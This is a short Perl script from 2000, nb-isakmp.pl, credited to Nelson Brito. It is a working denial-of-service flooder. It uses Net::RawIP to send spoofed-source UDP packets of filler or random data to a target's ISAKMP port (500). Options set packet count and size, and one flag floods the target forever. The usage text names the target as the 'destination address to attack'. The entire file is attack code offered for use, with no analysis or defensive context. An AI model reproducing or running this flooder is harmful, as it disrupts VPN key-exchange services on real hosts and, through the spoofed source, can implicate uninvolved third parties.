#!/usr/bin/perl -w
###############################################################################
# Author        :       Nelson Brito
# E-mail        :       nelson@SEKURE.ORG
# File          :       nb-isakmp.pl
# Version       :       0.3 Alpha
###############################################################################
use Socket;
use Net::RawIP;
use Getopt::Std;

getopts("s:d:p:l:n:v:t:f:rL",\%o);$ver="0.3a";$0=~s#.*/##;

print"--- $0 v.$ver b/ Nelson Brito / Independent Security Consultant ---\n";

$l=$o{'l'}?$o{'l'}+28:800+28;$n=$o{'n'}?$o{'n'}/2:800/2;
$v=$o{'v'}||4;$t=$o{'t'}||1;$f=$o{'f'}||0;$T=$o{'T'}||64;
$p=$o{'p'}?$o{'p'}:(getservbyname('isakmp','udp')||die"getservbyname: $!\n");

($o{'s'}&&$o{'d'})||die
"\nUse: $0 [IP Options] [UDP Options]\n\n",
"IP Options:\n",
"\t\t-s*\tsource address to spoof\n",
"\t\t-d*\tdestination address to attack\n",
"\t\t-v\tIP Version\t\t\t\t(def: $v)\n",
"\t\t-t\tIP Type of Service (TOS)\t\t(def: $t)\n",
"\t\t-f\tIP fragementation offset\t\t(def: $f)\n",
"\t\t-T\tIP Time to Live (TTL)\t\t\t(def: $T)\n",
"UDP Options:\n",
"\t\t-p\tdestination port to attack\t\t(def: $p)\n",
"\t\t-l\tpacket length to send\t\t\t(def: $l)\n",
"\t\t-r\tset randon data\t\t\t\t(def: \".\")\n",
"Generic:\n",
"\t\t-n\tnumber of packets to send\t\t(def: $n)\n",
"\t\t-L\tsend packets forever\n\n",
"Copyright © 2000 Nelson Brito <nelson\@SEKURE.ORG>.\n";

while($n > 0){
	$|=1;print".";$sp=int rand 65535;
	$D=$o{'r'}?(chr(int rand 255)) x $l:"." x $l;
	$nb=new Net::RawIP({
		ip=>
		{
			version=>$v,
			tos=>$t,
			ttl=>$T,
			frag_off=>$f,
			saddr=>$o{'s'},
			daddr=>$o{'d'}
		},
		udp=>
		{
			source=>$sp,
			dest=>$p,
			len=>$l,
			data=>$D
		}
	});
	$nb->send;undef $nb;!$o{'L'}&&$n--;
}
print"Finish!\n";
